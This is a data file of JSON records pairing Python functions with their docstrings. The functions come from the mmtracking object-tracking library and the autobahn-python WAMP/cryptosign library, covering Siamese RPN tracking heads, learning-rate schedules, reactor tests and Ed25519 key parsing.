{"docstring": "\"\"\"Track `prev_bbox` to current frame based on the output of network.\n\nArgs:\n    cls_score (Tensor): of shape (1, 2 * num_base_anchors, H, W).\n    bbox_pred (Tensor): of shape (1, 4 * num_base_anchors, H, W).\n    prev_bbox (Tensor): of shape (4, ) in [cx, cy, w, h] format.\n    scale_factor (Tensr): scale factor.\n\nReturns:\n    tuple(best_score, best_bbox): best_score is a Tensor denoting the\n    score of `best_bbox`, best_bbox is a Tensor of shape (4, )\n    with [cx, cy, w, h] format, which denotes the best tracked\n    bbox in current frame.\n\"\"\"\n", "func_signal": "def get_bbox(self, cls_score, bbox_pred, prev_bbox, scale_factor):\n", "code": "score_maps_size = [(cls_score.shape[2:])]\nif not hasattr(self, 'anchors'):\n    self.anchors = self.anchor_generator.grid_anchors(\n        score_maps_size, cls_score.device)[0]\nif not hasattr(self, 'windows'):\n    self.windows = self.anchor_generator.gen_2d_hanning_windows(\n        score_maps_size, cls_score.device)[0]\n\ncls_score = cls_score.permute(1, 2, 3, 0).contiguous()\ncls_score = cls_score.view(2, -1).permute(1, 0)\ncls_score = cls_score.softmax(dim=1)[:, 1]\n\nbbox_pred = bbox_pred.permute(1, 2, 3, 0).contiguous().view(4, -1)\nbbox_pred = bbox_pred.permute(1, 0)\nanchors = bbox_cxcywh_to_xyxy(self.anchors)\nbbox_pred = self.bbox_coder.decode(anchors, bbox_pred)\nbbox_pred = bbox_xyxy_to_cxcywh(bbox_pred)\n\ndef change_ratio(ratio):\n    return torch.max(ratio, 1. / ratio)\n\ndef enlarge_size(w, h):\n    pad = (w + h) * 0.5\n    return torch.sqrt((w + pad) * (h + pad))\n\n# scale penalty\nscale_penalty = change_ratio(\n    enlarge_size(bbox_pred[:, 2], bbox_pred[:, 3]) / enlarge_size(\n        prev_bbox[2] * scale_factor, prev_bbox[3] * scale_factor))\n\n# aspect ratio penalty\naspect_ratio_penalty = change_ratio(\n    (prev_bbox[2] / prev_bbox[3]) /\n    (bbox_pred[:, 2] / bbox_pred[:, 3]))\n\n# penalize cls_score\npenalty = torch.exp(-(aspect_ratio_penalty * scale_penalty - 1) *\n                    self.test_cfg.penalty_k)\npenalty_score = penalty * cls_score\n\n# window penalty\npenalty_score = penalty_score * (1 - self.test_cfg.window_influence) \\\n    + self.windows * self.test_cfg.window_influence\n\nbest_idx = torch.argmax(penalty_score)\nbest_score = cls_score[best_idx]\nbest_bbox = bbox_pred[best_idx, :] / scale_factor\n\n# smooth bbox\nfinal_bbox = torch.zeros_like(best_bbox)\nlr = penalty[best_idx] * cls_score[best_idx] * self.test_cfg.lr\nfinal_bbox[0] = best_bbox[0] + prev_bbox[0]\nfinal_bbox[1] = best_bbox[1] + prev_bbox[1]\nfinal_bbox[2] = prev_bbox[2] * (1 - lr) + best_bbox[2] * lr\nfinal_bbox[3] = prev_bbox[3] * (1 - lr) + best_bbox[3] * lr\n\nreturn best_score, final_bbox", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Generate the training targets for exemplar image and search image\npairs.\n\nArgs:\n    gt_bboxes (list[Tensor]): Ground truth bboxes of each\n        search image with shape (1, 5) in [0.0, tl_x, tl_y, br_x, br_y]\n        format.\n    score_maps_size (torch.size): denoting the output size\n        (height, width) of the network.\n    is_positive_pairs (bool): list of bool denoting whether each ground\n        truth bbox in `gt_bboxes` is positive.\n\nReturns:\n    tuple(all_labels, all_labels_weights, all_bbox_targets,\n    all_bbox_weights): the shape is (N, num_base_anchors, H, W),\n    (N, num_base_anchors, H, W), (N, 4, num_base_anchors, H, W),\n    (N, 4, num_base_anchors, H, W), respectively. All of them are\n    Tensor.\n\"\"\"\n", "func_signal": "def get_targets(self, gt_bboxes, score_maps_size, is_positive_pairs):\n", "code": "(all_labels, all_labels_weights, all_bbox_targets,\n all_bbox_weights) = [], [], [], []\n\nfor gt_bbox, is_positive_pair in zip(gt_bboxes, is_positive_pairs):\n    if is_positive_pair:\n        (labels, labels_weights, bbox_targets,\n         bbox_weights) = self._get_positive_pair_targets(\n             gt_bbox, score_maps_size)\n    else:\n        (labels, labels_weights, bbox_targets,\n         bbox_weights) = self._get_negative_pair_targets(\n             gt_bbox, score_maps_size)\n\n    all_labels.append(labels)\n    all_labels_weights.append(labels_weights)\n    all_bbox_targets.append(bbox_targets)\n    all_bbox_weights.append(bbox_weights)\n\nall_labels = torch.stack(all_labels)\nall_labels_weights = torch.stack(all_labels_weights) / len(\n    all_labels_weights)\nall_bbox_targets = torch.stack(all_bbox_targets)\nall_bbox_weights = torch.stack(all_bbox_weights) / len(\n    all_bbox_weights)\n\nreturn (all_labels, all_labels_weights, all_bbox_targets,\n        all_bbox_weights)", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Crop `input` as the size of `target`.\"\"\"\n", "func_signal": "def crop_like(self, input, target):\n", "code": "if input.size()[2:] == target.size()[2:]:\n    return input\nelse:\n    return input[:, :, :target.size(2), :target.size(3)]", "path": "mmtracking/mmtrack/models/motion/flownet_simple.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Forward with features `z_feats` of exemplar images and features\n`x_feats` of search images.\n\nArgs:\n    z_feats (tuple[Tensor]): Tuple of Tensor with shape (N, C, H, W)\n        denoting the multi level feature maps of exemplar images.\n        Typically H and W equal to 7.\n    x_feats (tuple[Tensor]): Tuple of Tensor with shape (N, C, H, W)\n        denoting the multi level feature maps of search images.\n        Typically H and W equal to 31.\n\nReturns:\n    tuple(cls_score, bbox_pred): cls_score is a Tensor with shape\n    (N, 2 * num_base_anchors, H, W), bbox_pred is a Tensor with shape\n    (N, 4 * num_base_anchors, H, W), Typically H and W equal to 25.\n\"\"\"\n", "func_signal": "def forward(self, z_feats, x_feats):\n", "code": "assert isinstance(z_feats, tuple) and isinstance(x_feats, tuple)\nassert len(z_feats) == len(x_feats) and len(z_feats) == len(\n    self.cls_heads)\n\nif self.weighted_sum:\n    cls_weight = nn.functional.softmax(self.cls_weight, dim=0)\n    reg_weight = nn.functional.softmax(self.reg_weight, dim=0)\nelse:\n    reg_weight = cls_weight = [\n        1.0 / len(z_feats) for i in range(len(z_feats))\n    ]\n\ncls_score = 0\nbbox_pred = 0\nfor i in range(len(z_feats)):\n    cls_score_single = self.cls_heads[i](z_feats[i], x_feats[i])\n    bbox_pred_single = self.reg_heads[i](z_feats[i], x_feats[i])\n    cls_score += cls_weight[i] * cls_score_single\n    bbox_pred += reg_weight[i] * bbox_pred_single\n\nreturn cls_score, bbox_pred", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Logarithmically varying learning rate.\n\nGenerator learning rate factor logarithmically varying from\n`start_lr_factor` to `end_lr_factor` in total `end_epoch - start_epoch`\nepochs.\n\nArgs:\n    start_lr_factor (float): Start learning rate factor.\n    end_lr_factor (float): End learning rate factor.\n    start_epoch (int): Start epoch.\n    end_epoch (int): End epoch.\n\nReturns:\n    ndarray: The logarithmically varying learning rate.\n\"\"\"\n", "func_signal": "def log_lr_interval(start_lr_factor, end_lr_factor, start_epoch, end_epoch):\n", "code": "epochs = end_epoch - start_epoch\nlr_intervals = np.logspace(\n    math.log10(start_lr_factor), math.log10(end_lr_factor), epochs)\nreturn lr_intervals", "path": "mmtracking/mmtrack/core/optimizer/sot_lr_updater.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Preprocess images pairs for computing flow.\n\nArgs:\n    imgs (Tensor): of shape (N, 6, H, W) encoding input images pairs.\n        Typically these should be mean centered and std scaled.\n    img_metas (list[dict]): list of image information dict where each\n        dict has: 'img_shape', 'scale_factor', 'flip', and may also\n        contain 'filename', 'ori_shape', 'pad_shape', and\n        'img_norm_cfg'. For details on the values of these keys see\n        `mmtrack/datasets/pipelines/formatting.py:VideoCollect`.\n\nReturns:\n    Tensor: of shape (N, 6, H, W) encoding the input images pairs for\n    FlowNetSimple.\n\"\"\"\n", "func_signal": "def prepare_imgs(self, imgs, img_metas):\n", "code": "if not hasattr(self, 'img_norm_mean'):\n    mean = img_metas[0]['img_norm_cfg']['mean']\n    mean = torch.tensor(mean, device=imgs.device)\n    self.img_norm_mean = mean.repeat(2)[None, :, None, None]\n\n    mean = self.flow_img_norm_mean\n    mean = torch.tensor(mean, device=imgs.device)\n    self.flow_img_norm_mean = mean.repeat(2)[None, :, None, None]\n\nif not hasattr(self, 'img_norm_std'):\n    std = img_metas[0]['img_norm_cfg']['std']\n    std = torch.tensor(std, device=imgs.device)\n    self.img_norm_std = std.repeat(2)[None, :, None, None]\n\n    std = self.flow_img_norm_std\n    std = torch.tensor(std, device=imgs.device)\n    self.flow_img_norm_std = std.repeat(2)[None, :, None, None]\n\nflow_img = imgs * self.img_norm_std + self.img_norm_mean\nflow_img = flow_img / self.flow_img_norm_std - self.flow_img_norm_mean\nflow_img[:, :, img_metas[0]['img_shape'][0]:, :] = 0.0\nflow_img[:, :, :, img_metas[0]['img_shape'][1]:] = 0.0\nflow_img = torch.nn.functional.interpolate(\n    flow_img,\n    scale_factor=self.img_scale_factor,\n    mode='bilinear',\n    align_corners=False)\nreturn flow_img", "path": "mmtracking/mmtrack/models/motion/flownet_simple.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Load public detections.\"\"\"\n# support detections in three formats\n# 1. MMDet: [img_1, img_2, ...]\n# 2. MMTrack: dict(bbox_results=[img_1, img_2, ...])\n# 3. Public:\n#    1) dict(img1_name: [], img2_name: [], ...)\n#    2) dict(bbox_results=dict(img1_name: [], img2_name: [], ...))\n# return as a dict or a list\n", "func_signal": "def load_detections(self, detection_file=None):\n", "code": "if detection_file is not None:\n    detections = mmcv.load(detection_file)\n    if isinstance(detections, dict):\n        # results from mmtrack\n        if 'bbox_results' in detections:\n            detections = detections['bbox_results']\n    else:\n        # results from mmdet\n        if not isinstance(detections, list):\n            raise TypeError('detections must be a dict or a list.')\n    return detections\nelse:\n    return None", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Generate the training targets for positive exemplar image and search\nimage pair.\n\nArgs:\n    gt_bbox (Tensor): Ground truth bboxes of an search image with\n        shape (1, 5) in [0.0, tl_x, tl_y, br_x, br_y] format.\n    score_maps_size (torch.size): denoting the output size\n        (height, width) of the network.\n\nReturns:\n    tuple(labels, labels_weights, bbox_targets, bbox_weights): the\n    shape is (num_base_anchors, H, W), (num_base_anchors, H, W),\n    (4, num_base_anchors, H, W), (4, num_base_anchors, H, W),\n    respectively. All of them are Tensor.\n\"\"\"\n", "func_signal": "def _get_positive_pair_targets(self, gt_bbox, score_maps_size):\n", "code": "(labels, labels_weights, bbox_targets,\n bbox_weights) = self._get_init_targets(gt_bbox, score_maps_size)\n\nC, H, W = labels.shape\nif not hasattr(self, 'anchors'):\n    self.anchors = self.anchor_generator.grid_anchors(\n        [score_maps_size], gt_bbox.device)[0]\nanchors = self.anchors.clone()\nanchors[:, :2] += self.train_cfg.search_size // 2\nanchors = bbox_cxcywh_to_xyxy(anchors)\n\nassign_result = self.assigner.assign(anchors, gt_bbox[:, 1:])\nsampling_result = self.sampler.sample(assign_result, anchors,\n                                      gt_bbox[:, 1:])\npos_inds = sampling_result.pos_inds\nneg_inds = sampling_result.neg_inds\nneg_upper_bound = int(self.sampler.num *\n                      (1 - self.sampler.pos_fraction))\nif len(neg_inds) > neg_upper_bound:\n    neg_inds = neg_inds[:neg_upper_bound]\n\nlabels = labels.view(-1)\nlabels_weights = labels_weights.view(-1)\nbbox_weights = bbox_weights.view(-1)\n\nif len(pos_inds) > 0:\n    labels[pos_inds] = 1\n    labels_weights[pos_inds] = 1.0 / len(pos_inds) / 2\n    bbox_weights[pos_inds] = 1.0 / len(pos_inds)\n\nif len(neg_inds) > 0:\n    labels[neg_inds] = 0\n    labels_weights[neg_inds] = 1.0 / len(neg_inds) / 2\n\nbbox_targets = self.bbox_coder.encode(\n    anchors, gt_bbox[:, 1:].repeat(anchors.shape[0], 1))\n\nlabels = labels.reshape(C, H, W)\nlabels_weights = labels_weights.reshape(C, H, W)\nbbox_targets = bbox_targets.T.reshape(4, C, H, W)\nbbox_weights = bbox_weights.reshape(C, H, W)\nbbox_weights = bbox_weights[None].repeat(4, 1, 1, 1)\nreturn labels, labels_weights, bbox_targets, bbox_weights", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Format tracking results.\"\"\"\n", "func_signal": "def format_track_results(self, results, infos, resfile):\n", "code": "with open(resfile, 'wt') as f:\n    for res, info in zip(results, infos):\n        if 'mot_frame_id' in info:\n            frame = info['mot_frame_id']\n        else:\n            frame = info['frame_id'] + 1\n        bboxes, labels, ids = restore_result(res, return_ids=True)\n        for bbox, label, id in zip(bboxes, labels, ids):\n            x1, y1, x2, y2, conf = bbox\n            f.writelines(\n                f'{frame},{id},{x1:.3f},{y1:.3f},{(x2-x1):.3f},' +\n                f'{(y2-y1):.3f},{conf:.3f},-1,-1,-1\\n')", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Exponentially varying learning rate.\n\nGenerator learning rate factor exponentially varying from `start_lr_factor`\nto `end_lr_factor` in total `end_epoch - start_epoch` epochs.\n\nArgs:\n    start_lr_factor (float): Start learning rate factor.\n    end_lr_factor (float): End learning rate factor.\n    start_epoch (int): Start epoch.\n    end_epoch (int): End epoch.\n\nReturns:\n    ndarray: The exponentially varying learning rate.\n\"\"\"\n", "func_signal": "def step_lr_interval(start_lr_factor, end_lr_factor, start_epoch, end_epoch):\n", "code": "epochs = end_epoch - start_epoch\nmult = math.pow(end_lr_factor / start_lr_factor, 1. / (epochs))\nlr_intervals = start_lr_factor * (mult**np.arange(epochs))\nreturn lr_intervals", "path": "mmtracking/mmtrack/core/optimizer/sot_lr_updater.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Generate the training targets for negative exemplar image and search\nimage pair.\n\nArgs:\n    gt_bbox (Tensor): Ground truth bboxes of an search image with\n        shape (1, 5) in [0.0, tl_x, tl_y, br_x, br_y] format.\n    score_maps_size (torch.size): denoting the output size\n        (height, width) of the network.\n\nReturns:\n    tuple(labels, labels_weights, bbox_targets, bbox_weights): the\n    shape is (num_base_anchors, H, W), (num_base_anchors, H, W),\n    (4, num_base_anchors, H, W), (4, num_base_anchors, H, W),\n    respectively. All of them are Tensor.\n\"\"\"\n", "func_signal": "def _get_negative_pair_targets(self, gt_bbox, score_maps_size):\n", "code": "(labels, labels_weights, bbox_targets,\n bbox_weights) = self._get_init_targets(gt_bbox, score_maps_size)\nC, H, W = labels.shape\ntarget_cx, target_cy, target_w, target_h = bbox_xyxy_to_cxcywh(\n    gt_bbox[:, 1:])[0]\nanchor_stride = self.anchor_generator.strides[0]\n\ncx = W // 2\ncy = H // 2\ncx += int(\n    torch.ceil((target_cx - self.train_cfg.search_size // 2) /\n               anchor_stride[0] + 0.5))\ncy += int(\n    torch.ceil((target_cy - self.train_cfg.search_size // 2) /\n               anchor_stride[1] + 0.5))\n\nleft = max(0, cx - 3)\nright = min(W, cx + 4)\ntop = max(0, cy - 3)\ndown = min(H, cy + 4)\n\nlabels[...] = -1\nlabels[:, top:down, left:right] = 0\n\nlabels = labels.view(-1)\nlabels_weights = labels_weights.view(-1)\nneg_inds = torch.nonzero(labels == 0, as_tuple=False)[:, 0]\nindex = torch.randperm(\n    neg_inds.numel(), device=neg_inds.device)[:self.train_cfg.num_neg]\nneg_inds = neg_inds[index]\n\nlabels[...] = -1\nif len(neg_inds) > 0:\n    labels[neg_inds] = 0\n    labels_weights[neg_inds] = 1.0 / len(neg_inds) / 2\nlabels[...] = 0\n\nlabels = labels.reshape(C, H, W)\nlabels_weights = labels_weights.reshape(C, H, W)\nbbox_weights = bbox_weights[None].repeat(4, 1, 1, 1)\nreturn labels, labels_weights, bbox_targets, bbox_weights", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Computing the `cls_score` and `bbox_pred` of the features `x` of key\nframe proposals.\n\nArgs:\n    x (Tensor): of shape [N, C, H, W]. N is the number of key frame\n        proposals.\n    ref_x (Tensor): of shape [M, C, H, W]. M is the number of reference\n        frame proposals.\n\nReturns:\n    tuple(cls_score, bbox_pred): The predicted score of classes and\n    the predicted regression offsets.\n\"\"\"\n# shared part\n", "func_signal": "def forward(self, x, ref_x):\n", "code": "if self.num_shared_convs > 0:\n    for conv in self.shared_convs:\n        x = conv(x)\n        ref_x = conv(ref_x)\n\nif self.num_shared_fcs > 0:\n    if self.with_avg_pool:\n        x = self.avg_pool(x)\n        ref_x = self.avg_pool(ref_x)\n\n    x = x.flatten(1)\n    ref_x = ref_x.flatten(1)\n\n    for i, fc in enumerate(self.shared_fcs):\n        x = fc(x)\n        ref_x = fc(ref_x)\n        x = x + self.aggregator[i](x, ref_x)\n        ref_x = self.inplace_false_relu(ref_x)\n        x = self.inplace_false_relu(x)\n\n# separate branches\nx_cls = x\nx_reg = x\n\nfor conv in self.cls_convs:\n    x_cls = conv(x_cls)\nif x_cls.dim() > 2:\n    if self.with_avg_pool:\n        x_cls = self.avg_pool(x_cls)\n    x_cls = x_cls.flatten(1)\nfor fc in self.cls_fcs:\n    x_cls = self.relu(fc(x_cls))\n\nfor conv in self.reg_convs:\n    x_reg = conv(x_reg)\nif x_reg.dim() > 2:\n    if self.with_avg_pool:\n        x_reg = self.avg_pool(x_reg)\n    x_reg = x_reg.flatten(1)\nfor fc in self.reg_fcs:\n    x_reg = self.relu(fc(x_reg))\n\ncls_score = self.fc_cls(x_cls) if self.with_cls else None\nbbox_pred = self.fc_reg(x_reg) if self.with_reg else None\nreturn cls_score, bbox_pred", "path": "mmtracking/mmtrack/models/roi_heads/bbox_heads/selsa_bbox_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"\nReturns the public key part of a signing key or the (public) verification key.\n\n:returns: The public key in Hex encoding.\n:rtype: str or None\n\"\"\"\n", "func_signal": "def public_key(self, binary=False):\n", "code": "if isinstance(self._key, signing.SigningKey):\n    key = self._key.verify_key\nelse:\n    key = self._key\n\nif binary:\n    return key.encode()\nelse:\n    return key.encode(encoder=encoding.HexEncoder).decode('ascii')", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n``install_optimal_reactor`` will install KQueueReactor on\nDarwin (OS X).\n\"\"\"\n", "func_signal": "def test_mac(self):\n", "code": "reactor_mock = Mock()\nself.patch_reactor(\"kqreactor\", reactor_mock)\nself.patch(sys, \"platform\", \"darwin\")\n\n# Emulate that a reactor has not been installed\nself.patch_modules()\n\nchoosereactor.install_optimal_reactor()\nreactor_mock.install.assert_called_once_with()", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "# create a new transport from the connection\n", "func_signal": "def main2(reactor, connection):\n", "code": "transport = yield connection.open()\n\n# create a new session running on the transport\nsession = yield transport.join(connection.config.realm)\n\n# now register a procedure\ndef add2(a, b):\n    return a + b\n\nyield session.register('com.example.add2', add2)\n\n# and call the procedure\nresult = yield session.call('com.example.add2', 2, 3)\nprint('result={}'.format(result))\n\n# now leave the realm, which frees the underlying transport\n# but freeze the session\nyield session.leave(freeze=True)\n\n# .. sleep, but not too long, otherwise router finally kills the session.\nyield sleep(60)\n\n# create a second, new transport from the connection\n# this might be a 2nd TCP connection or a 2nd logical WAMP transport running\n# over a single, multiplexed connection\ntransport2 = yield connection.open()\n\n# now resume the session on the new transport. using the session token mechanism,\n# the router will resume the session and deliver buffered events/calls to the\n# resumed session\nyield session.resume(transport2)\n\n# create a 2nd session running over the 1st transport\nsession2 = transport.join(connection.config.realm)\n\n# call the procedure registered on the (resumed) session running on transport2\nresult = yield session.call('com.example.add2', 2, 3)\nprint('result={}'.format(result))\n\n# if the transport supports multiplexing, multiple session can run\n# concurrently over the underlying transport\nif transport.is_multiplexed:\n    session3 = yield transport.join(connection.config.realm)\n\n# now finally leave sessions ..\nyield session.leave()\nyield session2.leave()\n\n# .. and close the transports\nyield transport.close()\nyield transport2.close()", "path": "autobahn-python/examples/twisted/wamp/work/newapi/test_newapi11.py", "commit_date": "2020-03-01 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n\nUsage:\n\n1. Get the OpenBSD 5.7 release public key from here\n\n    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/etc/signify/Attic/openbsd-57-base.pub?rev=1.1\n\n2. Generate QR Code and print to terminal\n\n    print(cryptosign._qrcode_from_signify_ed25519_pubkey('openbsd-57-base.pub'))\n\n3. Compare to (scroll down) QR code here\n\n    https://www.openbsd.org/papers/bsdcan-signify.html\n\"\"\"\n", "func_signal": "def _qrcode_from_signify_ed25519_pubkey(pubkey_file, mode='text'):\n", "code": "assert(mode in ['text', 'svg'])\n\nimport pyqrcode\n\nwith open(pubkey_file) as f:\n    pubkey = f.read().splitlines()[1]\n\n    qr = pyqrcode.create(pubkey, error='L', mode='binary')\n\n    if mode == 'text':\n        return qr.terminal()\n\n    elif mode == 'svg':\n        import io\n        data_buffer = io.BytesIO()\n\n        qr.svg(data_buffer, omithw=True)\n\n        return data_buffer.getvalue()\n\n    else:\n        raise Exception('logic error')", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nRead a public key from a Ed25519 key pair created with OpenBSD signify.\n\nhttp://man.openbsd.org/OpenBSD-current/man1/signify.1\n\"\"\"\n", "func_signal": "def _read_signify_ed25519_pubkey(pubkey_file):\n", "code": "with open(pubkey_file) as f:\n    # signature file format: 2nd line is base64 of 'Ed' || 8 random octets || 32 octets Ed25519 public key\n    pubkey = binascii.a2b_base64(f.read().splitlines()[1])[10:]\n    if len(pubkey) != 32:\n        raise Exception('bogus Ed25519 public key: raw key length was {}, but expected 32'.format(len(pubkey)))\n    return pubkey", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n\n:param key: A Ed25519 private signing key or a Ed25519 public verification key.\n:type key: instance of nacl.signing.VerifyKey or instance of nacl.signing.SigningKey\n\"\"\"\n", "func_signal": "def __init__(self, key, comment=None):\n", "code": "if not (isinstance(key, signing.VerifyKey) or isinstance(key, signing.SigningKey)):\n    raise Exception(\"invalid type {} for key\".format(type(key)))\n\nif not (comment is None or type(comment) == str):\n    raise Exception(\"invalid type {} for comment\".format(type(comment)))\n\nself._key = key\nself._comment = comment\nself._can_sign = isinstance(key, signing.SigningKey)", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n``install_optimal_reactor`` will install EPollReactor on Linux.\n\"\"\"\n", "func_signal": "def test_linux(self):\n", "code": "reactor_mock = Mock()\nself.patch_reactor(\"epollreactor\", reactor_mock)\nself.patch(sys, \"platform\", \"linux\")\n\n# Emulate that a reactor has not been installed\nself.patch_modules()\n\nchoosereactor.install_optimal_reactor()\nreactor_mock.install.assert_called_once_with()", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nPatch ``name`` so that Twisted will grab a fake reactor instead of\na real one.\n\"\"\"\n", "func_signal": "def patch_reactor(self, name, new_reactor):\n", "code": "if hasattr(twisted.internet, name):\n    self.patch(twisted.internet, name, new_reactor)\nelse:\n    def _cleanup():\n        delattr(twisted.internet, name)\n    setattr(twisted.internet, name, new_reactor)", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nUnpack a SSH agent key blob into parts.\n\nSee: http://blog.oddbit.com/2011/05/08/converting-openssh-public-keys/\n\"\"\"\n", "func_signal": "def _unpack(keydata):\n", "code": "parts = []\nwhile keydata:\n    # read the length of the data\n    dlen = struct.unpack('>I', keydata[:4])[0]\n\n    # read in <length> bytes\n    data, keydata = keydata[4:dlen + 4], keydata[4 + dlen:]\n    parts.append(data)\nreturn parts", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "# the session is joined and ready also!\n", "func_signal": "def setup(reactor, session):\n", "code": "def add2(a, b):\n    return a + b\nyield session.register('com.example.add2', add2)\nprint('procedure registered')\n# as we exit, this signals we are ready! the session must be kept.", "path": "autobahn-python/examples/twisted/wamp/work/newapi/test_newapi11.py", "commit_date": "2020-03-01 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nPatch ``sys.modules`` so that Twisted believes there is no\ninstalled reactor.\n\"\"\"\n", "func_signal": "def patch_modules(self):\n", "code": "old_modules = dict(sys.modules)\n\nnew_modules = dict(sys.modules)\ndel new_modules[\"twisted.internet.reactor\"]\n\ndef _cleanup():\n    sys.modules = old_modules\n\nself.addCleanup(_cleanup)\nsys.modules = new_modules", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nLoad an Ed25519 key from a SSH key file. The key file can be a (private) signing\nkey (from a SSH private key file) or a (public) verification key (from a SSH\npublic key file). A private key file must be passphrase-less.\n\"\"\"\n\n", "func_signal": "def from_ssh_key(cls, filename):\n", "code": "with open(filename, 'rb') as f:\n    keydata = f.read().decode('utf-8').strip()\nreturn cls.from_ssh_data(keydata)", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nParse an OpenSSH Ed25519 private key from a string into a raw private key.\n\nExample input:\n\n    -----BEGIN OPENSSH PRIVATE KEY-----\n    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n    QyNTUxOQAAACCbpA1OX6l7/8lYUoq7A1rFBcjqHWcgki8corTz81iVvQAAAKDWjZ0Y1o2d\n    GAAAAAtzc2gtZWQyNTUxOQAAACCbpA1OX6l7/8lYUoq7A1rFBcjqHWcgki8corTz81iVvQ\n    AAAEArodzIMjH9MOBz0X+HDvL06rEJOMYFhzGQ5zXPM7b7fZukDU5fqXv/yVhSirsDWsUF\n    yOodZyCSLxyitPPzWJW9AAAAFm9iZXJzdGV0QG9mZmljZS1jb3JlaTcBAgMEBQYH\n    -----END OPENSSH PRIVATE KEY-----\n\n\n:param keydata: The OpenSSH Ed25519 private key data to parse.\n:type keydata: str\n\n:returns: pair of raw private key (32 bytes) and comment\n:rtype: tuple\n\"\"\"\n\n# Some pointers:\n# https://github.com/ronf/asyncssh/blob/master/asyncssh/public_key.py\n# https://github.com/ronf/asyncssh/blob/master/asyncssh/ed25519.py\n# crypto_sign_ed25519_sk_to_seed\n# https://github.com/jedisct1/libsodium/blob/master/src/libsodium/crypto_sign/ed25519/sign_ed25519_api.c#L27\n# https://tools.ietf.org/html/draft-bjh21-ssh-ed25519-02\n# http://blog.oddbit.com/2011/05/08/converting-openssh-public-keys/\n\n", "func_signal": 